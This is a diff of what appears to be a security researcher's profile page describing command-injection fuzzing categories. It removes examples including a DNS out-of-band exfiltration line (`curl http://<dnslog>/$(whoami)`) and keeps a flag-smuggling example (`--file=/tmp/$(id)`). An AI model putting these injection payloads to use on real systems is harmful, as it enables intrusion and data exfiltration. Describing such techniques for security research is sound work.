@@ -183,12 +183,7 @@ My notable public works are listed below. Private techniques/tools, still active
 ---
 
 ### 🧬 Created Next-Gen Multi-Command Injection Fuzzing Techniques
-- **Comprehensive Injection Categories**  
-  - **Legacy**  
-    - *In-band*: direct output of commands (e.g. `id` → `uid=`)  
-    - *Time*: delay-based detection (e.g. `sleep 5`)  
-    - *DNSlog*: out-of-band via DNS beaconing (e.g. `curl http://<dnslog>/$(whoami)`)  
-  - **New Variants**  
+> While commix and others generate payloads for inject specific flag while my variants especially ICFI category is the fully automated, massively obfuscated, structure-aware, AI-assisted evolutions.
     - **XCI – eXtended Command Injection**  
       Injects inside CLI flags or redirection chains (e.g. `--file=/tmp/$(id)`)  
     - **RICI – Recursive Injection Command Invocation**  
